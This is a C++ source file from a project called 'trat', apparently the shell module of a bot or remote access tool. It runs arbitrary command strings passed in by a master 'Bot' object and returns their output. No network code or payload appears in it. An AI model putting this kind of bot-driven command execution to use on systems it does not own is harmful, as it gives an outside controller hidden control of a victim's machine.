/* trat/src/Shell/shell.cpp */
#include "../../include/shell.hpp"
#include <boost/process.hpp>
#include <sstream>
#include <filesystem>
#include <cstdlib>

namespace trat 
{
  void ShellResponse_destroy(ShellResponse *P_Shell_Response)
  {
    if (P_Shell_Response -> response != nullptr)
    {
      free(P_Shell_Response -> response);
      P_Shell_Response -> response = nullptr;
    }
  } 

  Shell::Shell(trat::Bot* P_Master_Bot) : masterBot(P_Master_Bot) {}
  /* To be freed */
  char* Shell::getCurrentPath() 
  {
    static std::string path = std::filesystem::current_path().string();
    return strdup(path.c_str());
  }

  bool Shell::executeShellCommandWithoutResponse(const char* Command) 
  {
    return std::system(Command) == 0;
  }

  ShellResponse Shell::executeShellCommand(const char* Command) 
  {
    ShellResponse shell_response;
    shell_response.isSuccessful = true;
    std::string result; // Ensure the memory is valid across calls
    std::mutex result_mutex; // Mutex to guard access to the result
    std::unique_lock<std::mutex> lock(result_mutex); // Lock during updates
    result.clear(); // Clear any previous result
    try 
    {
      boost::process::ipstream pipe_stream;
      boost::process::child process(Command, boost::process::std_out > pipe_stream);

      std::ostringstream oss;
      std::string line;

      while (pipe_stream && std::getline(pipe_stream, line))
      {
        oss << line << '\n';
      }
      process.wait();
      result = oss.str();

    }catch (const std::exception& e) 
    {
      result = "Error: ";
      result += e.what();
      shell_response.isSuccessful = false;
    }
      shell_response.response = strdup(result.c_str());
      return shell_response;
    }
} // namespace trat
